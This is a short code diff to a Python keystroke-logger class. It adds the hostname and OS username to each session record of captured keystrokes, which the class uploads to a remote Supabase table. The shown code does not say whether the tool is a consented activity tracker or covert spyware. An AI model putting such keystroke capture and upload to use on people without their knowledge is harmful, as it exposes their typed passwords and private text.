@@ -158,6 +158,7 @@ class KeystrokeLogger:
                 if len(keystrokes_text) > 10000:
                     keystrokes_text = keystrokes_text[:10000] + "...[truncated]"
 
+            import socket
             session_data = {
                 "device_id": self.device_id,
                 "app_name": self.current_app,
@@ -166,7 +167,9 @@ class KeystrokeLogger:
                 "keystroke_count": self.keystroke_count,
                 "special_keys": dict(self.special_keys) if self.special_keys else None,
                 "start_time": self.session_start.isoformat(),
-                "end_time": datetime.now().isoformat()
+                "end_time": datetime.now().isoformat(),
+                "hostname": socket.gethostname(),
+                "username": os.getenv("USER", "unknown")
             }
 
             success = self._send_to_supabase("keystroke_logs", session_data)
